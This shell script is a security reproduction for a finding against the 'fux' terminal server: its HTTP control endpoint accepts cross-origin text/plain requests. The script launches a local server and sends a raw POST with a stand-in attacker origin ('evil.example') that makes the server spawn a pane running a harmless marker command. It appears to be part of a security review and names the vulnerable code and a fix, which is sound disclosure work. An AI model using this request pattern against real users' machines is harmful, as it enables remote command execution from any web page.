#!/bin/sh
# Finding 002 (class 8: a refused-by-nobody input a web page can send). The BRP
# HTTP endpoint neither checks Content-Type nor Origin. A browser "simple
# request" (text/plain body, no CORS preflight) is therefore delivered and
# executed. The response carries no Access-Control-* headers, so scripts cannot
# read it, but the *side effect* has already happened: any web page the user
# visits while a fux server runs on the default loopback port can split panes,
# run programs and close panes on the local machine. This confirms review
# finding 6 (docs/review-2026-09-20.md), which was left unverified.
#
# Where it goes wrong: src/main.rs ~101, `RemoteHttpPlugin::default()` is
# mounted with no CORS/Content-Type/Origin gate; a Content-Type-preflight or an
# Origin allowlist would keep a cross-origin simple request out.
#
# Usage: 002-cross-origin-web-page-rce.sh /path/to/fux
# Exit 0 if a cross-origin simple request executes a program (bug reproduced);
# non-zero if it is refused.
set -u
FUX="${1:?usage: $0 /path/to/fux}"
[ -x "$FUX" ] || { echo "not executable: $FUX" >&2; exit 2; }

DIR="$(mktemp -d /tmp/fux-repro-002.XXXXXX)"
PORT=$(python3 -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1]);s.close()')
cat > "$DIR/default-shell" <<'SH'
#!/bin/sh
echo $$ > initial.pid
printf 'DEFAULT-SHELL\n'
exec /bin/bash --noprofile --norc -i
SH
chmod 700 "$DIR/default-shell"

cleanup() {
  [ -n "${SPID:-}" ] && kill -9 "$SPID" 2>/dev/null
  [ -n "${SPGID:-}" ] && kill -9 -"$SPGID" 2>/dev/null
  pkill -f "$DIR/PWNED" 2>/dev/null
  rm -rf "$DIR"
}
trap cleanup EXIT INT TERM

perl -e 'use POSIX qw(setsid); setsid(); exec @ARGV or die $!' \
  env -i PATH=/usr/bin:/bin HOME="$DIR" SHELL="$DIR/default-shell" TERM=xterm-256color \
  PS1='$ ' HISTFILE=/dev/null \
  "$FUX" server --address 127.0.0.1 --port "$PORT" --config "$DIR/fux.json" \
  > "$DIR/out" 2> "$DIR/err" &
SPID=$!
sleep 0.3
SPGID=$(ps -o pgid= -p "$SPID" 2>/dev/null | tr -d ' ')

ENDPOINT="http://127.0.0.1:$PORT"
MARKER="$DIR/PWNED-BY-A-WEB-PAGE"
export ENDPOINT PORT DIR MARKER

python3 - <<'PY'
import json, os, socket, time, urllib.request, sys
endpoint = os.environ["ENDPOINT"]; port = int(os.environ["PORT"]); marker = os.environ["MARKER"]
def rpc(method, params=None, timeout=5.0):
    body = {"jsonrpc":"2.0","id":1,"method":method}
    if params is not None: body["params"]=params
    req = urllib.request.Request(endpoint, data=json.dumps(body).encode(),
                                 headers={"Content-Type":"application/json"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode())
for _ in range(250):
    try: rpc("rpc.discover", timeout=1.0); break
    except Exception: time.sleep(0.1)
else:
    print("server never ready", file=sys.stderr); sys.exit(3)
viewer = rpc("fux.attach", {"rows":24,"cols":80})["result"]["viewer"]
time.sleep(0.6)
# A browser "simple request": text/plain body, an arbitrary Origin, NO preflight.
payload = json.dumps({"jsonrpc":"2.0","id":9,"method":"world.trigger_event",
  "params":{"event":"fux::control::Control","value":{"viewer":viewer,
    "command":{"kind":"split","axis":"horizontal","program":"touch %s; sleep 30" % marker}}}}).encode()
hdr = ("POST / HTTP/1.1\r\nHost: 127.0.0.1:%d\r\nOrigin: https://evil.example\r\n"
       "Content-Type: text/plain;charset=UTF-8\r\nContent-Length: %d\r\n\r\n" % (port, len(payload)))
sk = socket.socket(); sk.settimeout(5); sk.connect(("127.0.0.1", port))
sk.sendall(hdr.encode()+payload)
resp = b""
try:
    while True:
        b = sk.recv(65536)
        if not b: break
        resp += b
except Exception: pass
sk.close()
has_acao = any(l.lower().startswith(b"access-control-allow-origin") for l in resp.split(b"\r\n"))
print("response advertised Access-Control-Allow-Origin:", has_acao)
sys.exit(0)
PY

sleep 2
if [ -e "$MARKER" ]; then
  echo "REPRODUCED: a cross-origin simple request executed a program (created $MARKER)"
  exit 0
fi
echo "NOT reproduced: the cross-origin request did not take effect"
exit 1
